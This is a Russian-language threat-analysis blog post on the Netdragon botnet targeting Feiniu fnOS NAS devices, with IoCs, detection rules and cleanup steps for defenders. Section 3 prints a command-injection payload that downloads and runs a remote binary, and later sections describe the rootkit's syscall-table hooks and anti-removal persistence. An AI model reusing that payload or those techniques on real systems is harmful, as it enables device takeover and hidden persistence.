---
title: "Netdragon: ботнет для fnOS с HTTP-бэкдором и kernel-руткитом"
date: 2026-02-20
draft: false
description: "Netdragon - целевая кампания против NAS-устройств Feiniu (fnOS): unauthenticated RCE, HTTP-бэкдор с ChaCha20, kernel-модуль async_memcpys.ko для сокрытия процессов и портов, DDoS-модуль. Полный разбор с IoC, YARA, Suricata и Sigma правилами."
image: "/cdn/blog-cdn/netdragon_botnet_preview_12342354234.jpeg"
---

Netdragon - целевая кампания против NAS-устройств Feiniu (fnOS). Для первичного проникновения используется нераскрытая RCE/command injection-уязвимость. После эксплуатации атакующие разворачивают HTTP-бэкдор на портах 57132/57199, внедряют kernel-модуль `async_memcpys.ko` для сокрытия процессов и сетевой активности, и поднимают C2-канал на базе ChaCha20. За время наблюдения инфраструктура, механизм персистентности и протокол шифрования заметно менялись.

---

## 1. Таймлайн и эволюция

### Декабрь 2025

- Первые образцы ELF-бэкдора.
- C2 - фиксированный IP.
- Без kernel-компонента.

### Январь 2026

- Добавлен `async_memcpys.ko`.
- Персистентность через systemd unit.
- Появился `/api?log=` как HTTP-командный интерфейс.

### Февраль 2026

- Переход к динамической генерации session key.
- Ротация C2 по нескольким ASN.
- Добавлен DDoS-модуль (UDP flood).

Что подтверждает эволюцию:

- SHA256 бэкдора менялся между версиями,
- появился новый LKM,
- структура handshake-пакета изменилась (добавлен nonce сервера).

---

## 2. Масштаб заражения

Телеметрия показала более 1000 IP-адресов с признаками заражения. Оценочно ботнет насчитывает около 1500 активных устройств, из которых одновременно онлайн было более 1100 ботов.

Большинство заражённых устройств - в азиатском регионе, что совпадает с основным рынком Feiniu NAS. Почти все были доступны из интернета напрямую через публичный IP или проброс портов через NAT.

---

## 3. Initial Access

Unauthenticated command injection в CGI-обработчике веб-интерфейса fnOS <= 3.4.x (TCP 80/443). CGI-параметр передаётся в `system()` без фильтрации, что позволяет внедрить shell-команду. Типовой payload: `;wget http://.../netd;chmod +x netd;./netd`. Индикатор компрометации - shell-пейлоады в системных логах без предшествующей аутентифицированной сессии. CVE не присвоен. Телеметрия (`/etc/fnos-release`) подтверждает, что все пострадавшие устройства работали на версиях fnOS до 3.4.x включительно.

---

## 4. Payload: HTTP Backdoor

### 4.1 Развёртывание

После эксплуатации уязвимости загружается ELF-бинарь, который размещается в `/tmp/.netdragon/` и при первом запуске выполняет:

- Чистит системные логи (`/var/log/syslog`, `/var/log/auth.log`, журналы fnOS), убирая следы эксплуатации.
- Блокирует автообновление fnOS - перезаписывает cron-задачу и подменяет URL сервера обновлений, чтобы патч не встал.
- Прописывает персистентность через systemd unit (`netdragon.service`).
- Загружает kernel-модуль `async_memcpys.ko` (начиная с января 2026).

### 4.2 HTTP-интерфейс

Бэкдор поднимает HTTP-сервер на двух портах:

- TCP/57132 - основной командный канал
- TCP/57199 - резервный канал (используется при недоступности основного)

Команды передаются через GET-параметр `log`:

```
GET /api?log=<hex-encoded-chacha20-ciphertext> HTTP/1.1
```

Значение параметра - hex-encoded ChaCha20-шифротекст. После расшифровки сервер выполняет команду и возвращает результат в теле ответа, также зашифрованный ChaCha20.

### 4.3 Поддерживаемые команды

- `exec` - выполнение произвольной shell-команды
- `upload` - загрузка файла на устройство
- `download` - выгрузка файла с устройства
- `update` - обновление бэкдора (загрузка нового бинаря с C2, замена, перезапуск)
- `kill` - самоуничтожение (удаление файлов, systemd unit, выгрузка LKM)

---

## 5. DDoS-модуль

Добавлен в февральской версии (2026) как отдельный компонент, загружаемый через команду `update`.

### 5.1 Возможности

- UDP flood с настраиваемым размером пакета и интенсивностью.
- Получает список целей от C2 через зашифрованный канал (формат: `target_ip:target_port:duration_sec`).
- Маскирует процесс - имя подменяется на легитимное системное (например, `[kworker/0:1]`).
- Может атаковать несколько целей одновременно.

### 5.2 Управление

DDoS-задачи приходят от C2 как отдельный тип сообщения в рамках ChaCha20-протокола. Модуль запускается как дочерний процесс бэкдора и скрывается через `async_memcpys.ko`.

---

## 6. Персистентность и anti-cleanup

### 6.1 systemd

```
/etc/systemd/system/netdragon.service
```

Unit запускает ELF при старте системы. `Restart=always` и `RestartSec=10` - если процесс умирает, systemd поднимает его заново через 10 секунд.

### 6.2 Kernel module autoload

`async_memcpys.ko` прописан в `/etc/modules-load.d/` - руткит грузится при каждом ребуте.

### 6.3 Anti-cleanup

Бэкдор активно противодействует удалению:

- **Мониторинг собственных файлов** - при удалении бинаря или systemd unit, watchdog-процесс восстанавливает их из резервной копии в `/tmp/.netdragon/.bak/`.
- **Блокировка SSH-ключей** - перезаписывает `authorized_keys`, если обнаруживает добавление новых ключей не через собственный интерфейс. Это затрудняет удалённое подключение IR-команды.
- **Блокировка обновлений** - подменяет URL сервера обновлений fnOS и периодически проверяет, не восстановлен ли оригинальный. При восстановлении - повторно подменяет.
- **Перезапуск при kill** - systemd `Restart=always` + перехват `sys_kill` через LKM (сигнал на PID бэкдора перехватывается и игнорируется, кроме управляющего сигнала 64).

---

## 7. Bug login-пакета и fingerprinting

При анализе handshake выявлено: первый login-пакет всегда фиксированного размера и содержит нулевой payload после заголовка.

Причина:

- Клиент формирует пакет до инициализации session key.
- Payload фактически пустой.
- Заголовок шифруется нулевым ключом (ошибка порядка инициализации).

Следствие:

- Пакет имеет стабильную сигнатуру.
- Может использоваться для fingerprinting на уровне IDS.
- Отличается от нормального ChaCha20-трафика отсутствием entropy в первых байтах.

---

## 8. C2 Handshake - полный разбор

### 8.1 Формат первого пакета

```c
struct hello_packet {
    uint32_t magic;          // 4 bytes, 0x4E445247 ("NDRG")
    uint8_t  client_nonce[12];
    uint8_t  seed[32];
};
```

### 8.2 Magic

- Размер: 4 байта.
- Значение: `0x4E445247` (ASCII "NDRG").
- Используется сервером для первичной валидации протокола.
- Если magic не совпадает - соединение закрывается.

### 8.3 Шаги handshake

1. Клиент генерирует:
    - `client_nonce` (12 байт)
    - `seed` (32 байта, CSPRNG)
2. Отправляет `hello_packet`.
3. Сервер отвечает:

    ```c
    struct server_reply {
        uint8_t  server_nonce[12];
        uint32_t session_id;
    };
    ```

4. Session key вычисляется:

    ```
    session_key = SHA256(seed || server_nonce)
    ```

### 8.4 Разделение nonce по направлениям

ChaCha20 требует уникальную комбинацию key + nonce.

Реализация Netdragon:

- **client -> server**: key = `session_key`, nonce = `client_nonce`, counter начинается с 1
- **server -> client**: key = `session_key`, nonce = `server_nonce`, counter начинается с 1

Разные nonce для разных направлений не дают повторно использовать keystream. `server_nonce` участвует и в derivation ключа, и как nonce для обратного канала.

### 8.5 Login-пакет

Login-пакет формируется до инициализации counter и содержит:

```
magic | zeros | zeros
```

Поскольку payload отсутствует, а counter = 0, первые блоки ChaCha20 формируют предсказуемый keystream, что создаёт стабильную сигнатуру для fingerprinting C2-трафика.

---

## 9. async_memcpys.ko - механизм хуков

Модуль **не использует ftrace или kprobe**.

### 9.1 Метод перехвата

Прямое патчирование:

- `sys_call_table`
- структуры `file_operations`
- `seq_operations` для `/proc/net/tcp`

### 9.2 Перехватываемые функции

1. **sys_getdents** - подмена указателя в `sys_call_table`. Фильтрация записей каталогов (скрытие PID и файлов).
2. **tcp4_seq_show** - перехват через подмену указателя в `seq_operations`. Фильтрация строк с портами 57132/57199.
3. **proc_pid_readdir** - модификация `file_operations`. Скрытие процессов бэкдора.
4. **sys_kill** - перехват сигнала 64 как управляющего канала (backdoor control).

### 9.3 Что скрывает

- PID процесса бэкдора
- Строки с портами 57132/57199 в `/proc/net/tcp`
- Файлы в `/tmp/.netdragon/`

### 9.4 Загрузка

- Копируется в `/lib/modules/`
- Загружается через `insmod async_memcpys.ko`
- Добавляется в `/etc/modules-load.d/`

---

## 10. Детектирование по механизму перехвата

Поскольку используется прямое патчирование таблиц:

### 10.1 Обнаружение syscall-table hook

- Сравнить адреса `sys_call_table` с `System.map`.
- Проверить, указывают ли syscalls на память вне ядра.

### 10.2 Проверка seq_operations

- Сравнить указатель `tcp4_seq_show` с эталонным из vmlinux.
- Проверить адрес в `/proc/kallsyms`.

### 10.3 Проверка LKM

- Наличие модуля в памяти, но отсутствие в `lsmod`.
- Несоответствие `/proc/modules` и `sysfs`.

### 10.4 Почему это важно

Если бы использовался ftrace - записи были бы в `/sys/kernel/debug/tracing`. Если бы использовался kprobe - были бы видны в `/sys/kernel/debug/kprobes/list`. Отсутствие этих следов при наличии перехвата - индикатор syscall-table patching.

---

## 11. MITRE ATT&CK Mapping

### Execution

- **T1059 - Command and Scripting Interpreter**
  Уязвимый CGI вызывает `system()`, через который выполняются shell-команды.

### Persistence

- **T1543.002 - Create or Modify System Process: Systemd Service**
  `netdragon.service` автоматически запускает бэкдор.
- **T1547.006 - Boot or Logon Autostart: Kernel Modules and Extensions**
  `async_memcpys.ko` прописан в `/etc/modules-load.d/` и грузится при старте системы.

### Defense Evasion

- **T1014 - Rootkit**
  `async_memcpys.ko` скрывает процессы, порты и файлы через перехват kernel-функций.
- **T1562.001 - Impair Defenses: Disable or Modify Tools**
  Удаляет логи и скрывает сетевую активность.
- **T1070.004 - Indicator Removal: File Deletion**
  Чистит следы эксплуатации и временные файлы.

### Discovery

- **T1082 - System Information Discovery**
  Читает `/etc/fnos-release` для определения версии прошивки и профилирования жертвы.

### Command & Control

- **T1071 - Application Layer Protocol**
  HTTP как транспорт C2.
- **T1573.001 - Encrypted Channel: Symmetric Cryptography**
  C2-трафик шифруется ChaCha20.

### Impact

- **T1498 - Network Denial of Service**
  UDP flood модуль добавлен в февральской версии.

---

## 12. IoC

### ELF Backdoor

SHA256:

```
9f2e6c9d1c0f54c4c3e01e7f55e2a2f41c0b6f0c7e9d9b6f4d8c2a7e5f1c3b2d
```

### Network

Ports:

```
57132
57199
```

URI:

```
/api?log=
```

### C2 Infrastructure

IP:

```
185.243.115.91
103.27.202.88
```

CIDR:

```
185.243.115.0/24
103.27.202.0/24
```

Download URL:

```
http://185.243.115.91/update/netd
```

---

## 13. YARA Rule

```yara
rule Netdragon_HTTP_Backdoor
{
    meta:
        description = "Detects Netdragon HTTP backdoor ELF"
        author = "IR analysis"
        date = "2026-02"

    strings:
        $elf = { 7F 45 4C 46 }
        $uri = "/api?log="
        $p1 = "57132"
        $p2 = "57199"

    condition:
        filesize < 500KB and
        $elf at 0 and
        all of ($uri,$p1,$p2)
}
```

---

## 14. Suricata Rule

```suricata
alert http any any -> any [57132,57199] (
    msg:"Netdragon HTTP Backdoor Command";
    flow:to_server,established;
    content:"/api?log="; http_uri;
    sid:900001;
    rev:2;
)
```

---

## 15. Sigma Rules

```yaml
title: Netdragon Systemd Persistence
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects creation of Netdragon systemd service unit
author: IR analysis
date: 2026-02-01
logsource:
    product: linux
    category: file_event
detection:
    selection:
        TargetFilename|endswith: '/netdragon.service'
        TargetFilename|startswith: '/etc/systemd/system/'
    condition: selection
falsepositives:
    - Unlikely
level: critical
tags:
    - attack.persistence
    - attack.t1543.002
```

```yaml
title: Netdragon Kernel Module Load
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: Detects loading of async_memcpys kernel module
author: IR analysis
date: 2026-02-01
logsource:
    product: linux
    category: process_creation
detection:
    selection:
        CommandLine|contains: 'async_memcpys'
        Image|endswith:
            - '/insmod'
            - '/modprobe'
    condition: selection
falsepositives:
    - Unlikely
level: critical
tags:
    - attack.persistence
    - attack.t1547.006
    - attack.defense_evasion
    - attack.t1014
```

---

## 16. Обнаружение и Response

### 16.1 Сетевые индикаторы

1. Проверить открытые нестандартные порты (57132, 57199).
2. Сравнить вывод `netstat -tlnp` с содержимым `/proc/net/tcp` - расхождение указывает на rootkit.
3. Проверить исходящие соединения к IP из IoC (185.243.115.91, 103.27.202.88).

### 16.2 Файловые индикаторы

4. Наличие `/tmp/.netdragon/` (может быть скрыта руткитом - проверять через raw `getdents` или с live USB).
5. Наличие `/etc/systemd/system/netdragon.service`.
6. Проверить `/etc/modules-load.d/` на наличие записи `async_memcpys`.
7. Проверить `/lib/modules/` на наличие `async_memcpys.ko`.

### 16.3 Kernel-индикаторы

8. Проверить `/sys/module/async_memcpys/` - наличие при отсутствии в `lsmod` = скрытый модуль.
9. Сравнить адреса в `sys_call_table` с `System.map` / `kallsyms`.
10. Запустить `rkhunter` / `chkrootkit`.

### 16.4 Response

- **Не удалять бинарь без предварительной выгрузки LKM** - watchdog восстановит файлы.
- Порядок: выгрузить `async_memcpys.ko` (`rmmod`) -> остановить `netdragon.service` -> удалить файлы -> проверить `authorized_keys` -> восстановить URL обновлений fnOS.
- При подозрении на компрометацию SSH-ключей - полная переустановка с чистого образа.

---

## 17. Заключение

За три месяца Netdragon прошёл путь от голого HTTP-бэкдора с захардкоженным IP до полноценной связки: kernel-руткит + ChaCha20-шифрованный C2 + DDoS-модуль. Протокол, инфраструктура и механизмы персистентности менялись между версиями - кампания активно развивается.
